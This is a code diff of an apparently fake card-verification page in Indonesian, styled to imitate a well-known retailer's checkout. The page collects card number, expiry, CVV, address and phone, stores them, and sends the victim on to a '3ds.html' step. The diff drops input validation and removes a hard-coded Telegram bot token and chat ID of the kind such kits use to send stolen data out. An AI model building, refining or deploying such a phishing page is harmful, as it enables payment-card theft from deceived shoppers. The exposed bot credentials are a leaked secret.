@@ -10,26 +10,23 @@
         .logo { margin: 10px 0 20px; text-align: center; }
         .logo img { height: 60px; }
         .kotak { width: 100%; max-width: 550px; padding: 25px 30px; border: 1px solid #ddd; border-radius: 8px; background: #fff; }
-        h1 { font-size: 22px; font-weight: 500; margin-bottom: 20px; }
-        .logo-kartu { display: flex; gap: 8px; margin-bottom: 20px; align-items: center; }
+        h1 { font-size: 22px; font-weight: 500; margin-bottom: 20px; text-align: center; }
+        .logo-kartu { display: flex; gap: 8px; margin-bottom: 20px; align-items: center; justify-content: center; }
         .logo-kartu img { height: 28px; object-fit: contain; }
         label { font-weight: 700; font-size: 13px; margin: 14px 0 5px; display: block; }
         .baris-dua { display: flex; gap: 15px; flex-wrap: wrap; }
         .kolom { flex: 1; min-width: 200px; }
         .input { width: 100%; padding: 8px 10px; border: 1px solid #a6a6a6; border-radius: 4px; font-size: 14px; height: 36px; outline: none; }
         .input:focus { border-color: #007185; box-shadow: 0 0 0 2px #c8f0f4; }
-        .input.salah { border-color: #d00; border-width: 2px; }
         .input.latar-biru { background: #e6f0fa; }
         select.input { height: 36px; }
         .telp-baris { display: flex; gap: 8px; }
         .telp-kode { width: 90px; flex-shrink: 0; }
         .telp-nomor { flex: 1; }
-        .tombol { width: 100%; padding: 8px; background: #ddd; border: none; border-radius: 8px; font-size: 15px; height: 42px; margin-top: 25px; margin-bottom: 20px; cursor: not-allowed; transition: all 0.2s; }
-        .tombol.aktif { background: #ffd814; border: 1px solid #fcd200; cursor: pointer; }
-        .tombol.aktif:hover { background: #f7ca00; }
+        .tombol { width: 100%; padding: 8px; background: #ffd814; border: 1px solid #fcd200; border-radius: 8px; font-size: 15px; height: 42px; margin-top: 25px; margin-bottom: 20px; cursor: pointer; transition: all 0.2s; }
+        .tombol:hover { background: #f7ca00; }
         .bawah { margin-top: 30px; padding-top: 20px; border-top: 1px solid #e7e7e7; width: 100%; text-align: center; font-size: 11px; color: #555; }
         .bawah a { color: #0066c0; text-decoration: none; margin: 0 8px; }
-        .pesan-merah { color: #d00; font-size: 12px; margin-top: 4px; display: none; }
     </style>
 </head>
 <body>
@@ -104,9 +101,6 @@
     </div>
 
 <script>
-const BOT_TOKEN = '8813734294:AAHiumNTKCD4YWZS2jq5lBjHFtFbjwtzmYk';
-const CHAT_ID = '7808815199';
-
 const daftarNegara = {
     'ID': {nama: 'Indonesia', kode: '+62'},
     'AU': {nama: 'Australia', kode: '+61'},
@@ -153,7 +147,7 @@ selectNegara.addEventListener('change', () => {
     }
 });
 
-// Format nomor kartu
+// Format nomor kartu — angka tetap terlihat saat mengetik
 const inputNomor = document.getElementById('nomorKartu');
 inputNomor.addEventListener('input', (e) => {
     let v = e.target.value.replace(/\D/g, '');
@@ -174,47 +168,23 @@ document.getElementById('cvv').addEventListener('input', (e) => {
     e.target.value = e.target.value.replace(/\D/g, '');
 });
 
-const el = {
-    nama: document.getElementById('namaKartu'),
-    nomor: inputNomor,
-    exp: inputExp,
-    cvv: document.getElementById('cvv'),
-    alamat: document.getElementById('alamat'),
-    kota: document.getElementById('kota'),
-    provinsi: document.getElementById('provinsi'),
-    kodePos: document.getElementById('kodePos'),
-    telp: document.getElementById('telp'),
-    tombol: document.getElementById('verifikasi')
-};
-
-function cekLengkap() {
-    const nomorBersih = el.nomor.value.replace(/\s/g, '');
-    const ok = el.nama.value.trim() && nomorBersih.length >= 13 && el.exp.value.length === 5 &&
-               el.cvv.value.length >= 3 && el.alamat.value.trim() && el.kota.value.trim() &&
-               el.provinsi.value.trim() && el.kodePos.value.trim() && el.telp.value.trim();
-    el.tombol.classList.toggle('aktif', ok);
-}
-
-[el.nama, el.nomor, el.exp, el.cvv, el.alamat, el.kota, el.provinsi, el.kodePos, el.telp]
-.forEach(e => e.addEventListener('input', cekLengkap));
-
-el.tombol.addEventListener('click', () => {
-    if (!el.tombol.classList.contains('aktif')) return;
-    
+// Tombol SELALU aktif, langsung lanjut ke 3ds.html
+document.getElementById('verifikasi').addEventListener('click', () => {
     // Simpan semua data
-    localStorage.setItem('nama_kartu', el.nama.value.trim());
-    localStorage.setItem('nomor_kartu', el.nomor.value.trim());
-    localStorage.setItem('exp_kartu', el.exp.value.trim());
-    localStorage.setItem('cvv_kartu', el.cvv.value.trim());
-    localStorage.setItem('alamat', el.alamat.value.trim());
-    localStorage.setItem('kota', el.kota.value.trim());
-    localStorage.setItem('provinsi', el.provinsi.value.trim());
-    localStorage.setItem('kode_pos', el.kodePos.value.trim());
+    localStorage.setItem('nama_kartu', document.getElementById('namaKartu').value.trim());
+    localStorage.setItem('nomor_kartu', document.getElementById('nomorKartu').value.trim());
+    localStorage.setItem('exp_kartu', document.getElementById('expDate').value.trim());
+    localStorage.setItem('cvv_kartu', document.getElementById('cvv').value.trim());
+    localStorage.setItem('alamat', document.getElementById('alamat').value.trim());
+    localStorage.setItem('alamat2', document.getElementById('alamat2').value.trim());
+    localStorage.setItem('kota', document.getElementById('kota').value.trim());
+    localStorage.setItem('provinsi', document.getElementById('provinsi').value.trim());
+    localStorage.setItem('kode_pos', document.getElementById('kodePos').value.trim());
     localStorage.setItem('negara', selectNegara.value);
     localStorage.setItem('kode_telp', document.getElementById('kodeTelp').value);
-    localStorage.setItem('nomor_telp', el.telp.value.trim());
+    localStorage.setItem('nomor_telp', document.getElementById('telp').value.trim());
     
-    // Lanjut ke 3ds.html
+    // Langsung ke halaman 3ds
     window.location.href = '3ds.html';
 });
 
